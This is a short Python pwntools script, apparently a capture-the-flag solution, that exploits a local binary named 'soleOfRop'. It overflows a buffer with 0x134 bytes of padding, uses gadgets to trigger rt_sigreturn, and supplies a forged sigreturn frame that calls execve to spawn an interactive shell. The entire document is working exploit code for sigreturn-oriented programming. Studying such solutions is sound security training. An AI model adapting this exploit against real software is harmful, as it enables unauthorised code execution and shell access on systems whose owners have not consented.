from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

frame = SigreturnFrame(kernel="amd64")
frame.rax = 59
frame.rdi = 0x6001aa
frame.rsi = 0
frame.rdx = 0
frame.rip = 0x00000000004000fd

payload =  b"A"*0x134
payload += p64(0x0000000000400177)
payload += p64(0xf)
payload += p64(0x00000000004000fd)
payload += bytes(frame)

p = process("soleOfRop")
p.sendline(payload)
p.interactive()
